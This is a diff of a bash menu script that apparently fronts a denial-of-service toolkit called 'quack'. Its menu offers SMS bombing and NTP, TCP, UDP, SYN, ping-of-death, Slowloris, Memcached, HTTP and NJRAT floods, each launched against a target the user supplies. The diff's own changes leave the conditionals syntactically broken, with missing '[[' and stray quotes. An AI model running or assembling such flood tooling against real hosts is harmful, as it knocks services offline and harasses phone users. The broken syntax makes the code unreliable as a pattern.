@@ -43,32 +43,32 @@ ${green}[${yellow}05${green}] ${white}SYN Attack              ${green}[${yellow}
 echo -e -n "${green}
 Select option: "${white}
 read -r option
-if [[${option} == 01 || ${option} == 1]]; then
+if ${option} == "01" || ${option} == "1"]]; then
 quacksms
-elif [[${option} == 02 || ${option} == 2]]; then
+elif ${option} == "02" || ${option} == "2"]]; then
 quacktype="NTP"
 quackip
-elif [[${option} == 03 || ${option} == 3]]; then
+elif ${option} == "03" || ${option} == "3"]]; then
 quacktype="TCP"
 quackip
-elif [[${option} == 04 || ${option} == 4]]; then
+elif ${option} == "04" || ${option} == "4"]]; then
 quacktype="UDP"
 quackip
-elif [[${option} == 05 || ${option} == 5]]; then
+elif ${option} == "05" || ${option} == "5"]]; then
 quacktype="SYN"
 quackip
-elif [[${option} == 06 || ${option} == 6]]; then
+elif ${option} == "06" || ${option} == "6"]]; then
 quacktype="POD"
 quackip
-elif [[${option} == 07 || ${option} == 7]]; then
+elif ${option} == "07" || ${option} == "7"]]; then
 quacktype="SLOWLORIS"
 quackip
-elif [[${option} == 08 || ${option} == 8]]; then
+elif ${option} == "08" || ${option} == "8"]]; then
 quacktype="MEMCACHED"
 quackip
-elif [[${option} == 09 || ${option} == 9]]; then
+elif ${option} == "09" || ${option} == "9"]]; then
 quackhttp
-elif [[${option} == 10 || ${option} == 10]]; then
+elif ${option} == "10" || ${option} == "10"]]; then
 quacktype="NJRAT"
 quackip
 else echo -e "${red}Invalid option"${white}
@@ -89,7 +89,7 @@ ${green}Target: ${yellow}${target}${green}, Timeout: ${yellow}${timeout}${green}
 
 ${white}Continue? y/N - "${yellow}
 
-if [[$continue == y || $continue == Y]]; then
+if [[$continue == y || $continue == Y"]]; then
 cd core
 python quack --tool SMS --target ${target} --timeout ${timeout} --threads ${threads}
 cd
@@ -111,7 +111,7 @@ ${green}Target: ${yellow}${target}${green}, Timeout: ${yellow}${timeout}${green}
 
 ${white}Continue? y/N - "${yellow}
 
-if [[$continue == y || $continue == Y]]; then
+if [[$continue == y || $continue == Y"]]; then
 cd core
 python quack --tool ${quacktype} --target ${target} --timeout ${timeout} --threads ${threads}
 cd
@@ -133,7 +133,7 @@ ${green}Target: ${yellow}${target}${green}, Timeout: ${yellow}${timeout}${green}
 
 ${white}Continue? y/N - "${yellow}
 
-if [[$continue == y || $continue == Y]]; then
+if [[$continue == y || $continue == Y"]]; then
 cd core
 python quack --tool HTTP --target ${target} --timeout ${timeout} --threads ${threads}
 cd
